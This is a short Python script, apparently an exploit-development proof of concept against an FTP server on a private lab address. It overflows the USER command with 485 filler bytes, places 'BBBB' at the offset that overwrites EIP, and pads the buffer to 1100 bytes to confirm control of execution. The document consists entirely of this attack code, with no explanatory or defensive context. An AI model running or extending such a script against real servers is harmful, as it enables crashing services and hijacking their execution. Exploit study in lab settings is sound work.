#!/usr/bin/python
import socket

offset_to_eip = 485
total_size = 1100
buffer = "A" * offset_to_eip
buffer += "BBBB"
buffer += "A" * (total_size - len(buffer))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.0.234', 21))
print(s.recv(1024))
s.send(('USER ' + buffer + '\r\n').encode())
print(s.recv(1024))
s.send('PASS PASSWORD\r\n'.encode())
s.close()
